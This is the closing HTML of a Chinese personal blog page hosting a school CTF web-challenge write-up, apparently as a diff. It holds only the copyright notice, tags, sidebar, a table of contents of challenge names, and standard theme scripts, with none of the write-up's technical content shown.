+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://utahamo.github.io">Nanamo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://utahamo.github.io/2024/04/14/%E6%A0%A1%E8%B5%9Bwp-nanamo%E7%89%88%E6%9C%AC-WEB/">https://utahamo.github.io/2024/04/14/%E6%A0%A1%E8%B5%9Bwp-nanamo%E7%89%88%E6%9C%AC-WEB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://utahamo.github.io" target="_blank">Nanamo - 纯纯的二刺螈</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a><a class="post-meta__tags" href="/tags/Safety/">Safety</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Cve/">Cve</a><a class="post-meta__tags" href="/tags/Python/">Python</a><a class="post-meta__tags" href="/tags/php/">php</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230027875.gif" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/03/20/Shiro550%E5%88%86%E6%9E%90/" title="Shiro550流程分析"><img class="cover" src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230027875.gif" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Shiro550流程分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/20/Shiro550%E5%88%86%E6%9E%90/" title="Shiro550流程分析"><img class="cover" src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230027875.gif" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-20</div><div class="title">Shiro550流程分析</div></div></a></div><div><a href="/2023/09/28/%E5%87%BA%E9%A2%98%E6%95%99%E7%A8%8B/" title="出题教程"><img class="cover" src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230027873.gif" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-28</div><div class="title">出题教程</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404142051038.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Nanamo</div><div class="author-info__description">我不是二次元</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Utahamo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Utahamo" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS链接"><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">正在疯狂吸食</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hacker-ouT"><span class="toc-number">1.</span> <span class="toc-text">Hacker ouT!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%B7%E5%86%BD%E8%B0%B7%E7%9A%84%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">2.</span> <span class="toc-text">冷冽谷的哥斯拉</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-tricks"><span class="toc-number">3.</span> <span class="toc-text">php_tricks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iT%E2%80%99s-MyPin"><span class="toc-number">4.</span> <span class="toc-text">iT’s MyPin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jenkinslove"><span class="toc-number">5.</span> <span class="toc-text">jenkinslove</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%87%E6%80%BB"><span class="toc-number">6.</span> <span class="toc-text">汇总</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/04/14/%E6%A0%A1%E8%B5%9Bwp-nanamo%E7%89%88%E6%9C%AC-WEB/" title="Chive ctf校赛wp-nanamo版本-WEB"><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230027875.gif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chive ctf校赛wp-nanamo版本-WEB"/></a><div class="content"><a class="title" href="/2024/04/14/%E6%A0%A1%E8%B5%9Bwp-nanamo%E7%89%88%E6%9C%AC-WEB/" title="Chive ctf校赛wp-nanamo版本-WEB">Chive ctf校赛wp-nanamo版本-WEB</a><time datetime="2024-04-14T12:42:58.130Z" title="发表于 2024-04-14 20:42:58">2024-04-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/20/Shiro550%E5%88%86%E6%9E%90/" title="Shiro550流程分析"><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230027875.gif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro550流程分析"/></a><div class="content"><a class="title" href="/2024/03/20/Shiro550%E5%88%86%E6%9E%90/" title="Shiro550流程分析">Shiro550流程分析</a><time datetime="2024-03-20T03:14:55.714Z" title="发表于 2024-03-20 11:14:55">2024-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/28/unraid%E7%9B%98%E7%AC%A6%E5%8F%AA%E8%AF%BB%E4%BA%8B%E4%BB%B6/" title="Unraid盘符的只读问题修复"><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230027874.gif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Unraid盘符的只读问题修复"/></a><div class="content"><a class="title" href="/2023/09/28/unraid%E7%9B%98%E7%AC%A6%E5%8F%AA%E8%AF%BB%E4%BA%8B%E4%BB%B6/" title="Unraid盘符的只读问题修复">Unraid盘符的只读问题修复</a><time datetime="2023-09-27T16:51:34.037Z" title="发表于 2023-09-28 00:51:34">2023-09-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/28/%E5%87%BA%E9%A2%98%E6%95%99%E7%A8%8B/" title="出题教程"><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230027873.gif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="出题教程"/></a><div class="content"><a class="title" href="/2023/09/28/%E5%87%BA%E9%A2%98%E6%95%99%E7%A8%8B/" title="出题教程">出题教程</a><time datetime="2023-09-27T16:46:09.055Z" title="发表于 2023-09-28 00:46:09">2023-09-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Nanamo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
